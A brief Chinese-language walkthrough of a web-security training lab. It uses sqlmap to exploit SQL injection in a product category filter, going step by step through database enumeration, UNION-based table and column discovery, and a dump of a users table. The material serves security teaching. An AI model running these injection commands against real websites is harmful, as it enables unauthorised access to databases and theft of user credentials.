发现产品类型更改处存在sql注入，为了获取数据表的详细内容使用sqlmap





# 确定注入点：

```javascript
sqlmap  -u"https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories" --dbs
```



# 爆表：

```javascript
 sqlmap  -u"https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories" 
 --tables -D"public" --technique U
 
 --technique U 使用union联合注入
```



# 爆字段：

```javascript
 sqlmap  -u"https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories" 
 --columns -T"users_ygohdx" -D"public" --technique U
```



# 爆字段内容：

```javascript
sqlmap  -u"https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories" 
--dump -T"users_ygohdx" -D"public" --technique U –force-ssl

–force-ssl 强制为ssl链接
```

